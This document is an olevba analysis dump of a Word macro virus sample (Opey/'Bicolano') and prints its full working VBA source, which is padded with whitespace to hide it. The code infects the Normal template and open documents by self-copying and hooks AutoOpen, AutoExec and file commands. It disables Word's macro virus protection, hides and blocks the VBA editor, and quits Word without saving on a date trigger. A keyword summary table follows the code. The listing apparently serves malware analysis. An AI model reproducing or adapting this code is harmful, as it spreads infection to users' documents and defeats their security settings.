olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.l-3e899da9046f1793e44fec42566f4e55922754c2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.l-3e899da9046f1793e44fec42566f4e55922754c2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bicolano.bas 
in file: Virus.MSWord.Opey.l-3e899da9046f1793e44fec42566f4e55922754c2 - OLE stream: 'Macros/VBA/Bicolano'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                          
                                                                           Dim CarrierName As String
                                                                           Dim VictimName As String
                                                                           Dim IDString As String
                                                                           Dim Author As String
                                                                           Dim NT As Object
                                                                           Dim AD As Object
                                                                           Dim NTInfected As Boolean
                                                                           Dim ADInfected As Boolean
                                                                           Dim DocCount As Integer
                                                                           Private Sub MainOfBicolano()
                                                                              Initialize
                                                                              CleanMe NT
                                                                              If Not NTInfected Then CopyBicolano CarrierName, VictimName
                                                                              If DocCount > 0 Then
                                                                                 CleanMe AD
                                                                                 If Not ADInfected Then CopyBicolano CarrierName, VictimName
                                                                              End If
                                                                              Call Action
                                                                           End Sub
                                                                           Private Sub CleanMe(Dirty)
                                                                              Dim AttachedMacro
                                                                              Dim Tempo As Object
                                                                              Dim Name As String
                                                                              
                                                                              On Error Resume Next
                                                                              NTInfected = False
                                                                              ADInfected = False
                                                                              For Each AttachedMacro In Dirty.VBProject.VBComponents
                                                                                 Name = AttachedMacro.Name
                                                                                 If (Name <> IDString) And (Name <> "ThisDocument") Then
                                                                                    Application.OrganizerDelete Dirty.FullName, Name, wdOrganizerObjectProjectItems
                                                                                 ElseIf Name = IDString Then
                                                                                    If Dirty = NT Then NTInfected = True
                                                                                    If Dirty = AD Then ADInfected = True
                                                                                 End If
                                                                                 Set Tempo = Dirty.VBProject.VBComponents(1)
                                                                                 Tempo.CodeModule.DeleteLines 1, Tempo.CodeModule.CountOfLines
                                                                              Next AttachedMacro
                                                                           End Sub
                                                                           Private Sub CopyBicolano(Src, Dst)
                                                                              Application.OrganizerCopy Src, Dst, IDString, wdOrganizerObjectProjectItems
                                                                           End Sub
                                                                           
                                                                           Private Sub Initialize()
                                                                              Dim Carrier
                                                                              On Error Resume Next
                                                                                   
                                                                              Activate
                                                                              IDString = "Bicolano"
                                                                              Author = "JACH"
                                                                              DocCount = Documents.Count
                                                                              Set NT = NormalTemplate
                                                                              If DocCount > 0 Then Set AD = ActiveDocument
                                                                              Carrier = MacroContainer
                                                                              If (Carrier = NT) And (DocCount > 0) Then
                                                                                 CarrierName = NT.FullName
                                                                                 VictimName = AD.FullName
                                                                              ElseIf (Carrier = AD) And (DocCount > 0) Then
                                                                                 CarrierName = AD.FullName
                                                                                 VictimName = NT.FullName
                                                                              End If
                                                                           End Sub
                                                                           
                                                                           Private Sub Activate()
                                                                              On Error Resume Next
                                                                              Application.UserName = "Bicolano"
                                                                              Application.UserInitials = "JACH"
                                                                              Application.UserAddress = "Naga City, Philippines"
                                                                              
                                                                              System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\MS Setup (ACME)\User Info", "DefName") = "Ma - uurag kami"
                                                                              System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\MS Setup (ACME)\User Info", "DefCompany") = "Bicolano"
                                                                              With Dialogs(wdDialogFileSummaryInfo)
                                                                                 .Author = "Bicolano"
                                                                                 .Title = "Magaling ang mga Bicolano"
                                                                                 .Execute
                                                                              End With
                                                                              
                                                                              With Options
                                                                                 .ConfirmConversions = False
                                                                                 .SaveNormalPrompt = False
                                                                                 .VirusProtection = False
                                                                              End With
                                                                              
                                                                              On Error Resume Next
                                                                              CommandBars("Visual Basic").Visible = False
                                                                              CommandBars("Visual Basic").Enabled = False
                                                                              CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
                                                                              CommandBars("Visual Basic").Protection = msoBarNoCustomize
                                                                              CustomizationContext = NormalTemplate
                                                                              FindKey(KeyCode:=BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
                                                                              FindKey(KeyCode:=BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
                                                                           End Sub
                                                                           Sub FileSave()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                              ActiveDocument.Save
                                                                           End Sub
                                                                           Sub FileClose()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                              If ActiveDocument.Saved = False Then ActiveDocument.Save
                                                                              ActiveDocument.Close
                                                                           End Sub
                                                                           Sub FileExit()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                              If ActiveDocument.Saved = False Then ActiveDocument.Save
                                                                              Application.Quit
                                                                           End Sub
                                                                           Sub FileNew()
                                                                              On Error Resume Next
                                                                              Dialogs(wdDialogFileNew).Show
                                                                              newfile$ = 1
                                                                              MainOfBicolano
                                                                           End Sub
                                                                           Sub AutoOpen()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                           End Sub
                                                                           Sub AutoExec()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                           End Sub
                                                                           Sub FileSaveAs()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                              Dialogs(wdDialogFileSaveAs).Show
                                                                           End Sub
                                                                           Sub FilePageSetup()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                              Dialogs(wdDialogFilePageSetup).Show
                                                                           End Sub
                                                                           Sub FilePrint()
                                                                              On Error Resume Next
                                                                              MainOfBicolano
                                                                              Dialogs(wdDialogFilePrint).Show
                                                                           End Sub
                                                                           Sub FileOpen()
                                                                              On Error Resume Next
                                                                              Dialogs(wdDialogFileOpen).Show
                                                                              MainOfBicolano
                                                                           End Sub
                                                                           
                                                                           Sub ViewVBCode()
                                                                              MainOfBicolano
                                                                           End Sub
                                                                           
                                                                           Sub ToolsMacro()
                                                                              MainOfBicolano
                                                                           End Sub
                                                                           
                                                                           Private Sub Action()
                                                                              If (WeekDay(Date) = vbWednesday) And (Month(Date) > 11) Then
                                                                                 If Minute(Time) > 50 Then
                                                                                    Beep
                                                                                    MsgBox "I love UPLB and FOREHA!", vbInformation, "Mauurag ang mga Bicolano"
                                                                                    Beep
                                                                                    MsgBox "See more of me soon!!! Bye!!", vbCritical, "Bicolano"
                                                                                    Application.Quit wdDoNotSaveChanges
                                                                                 End If
                                                                              End If
                                                                           End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

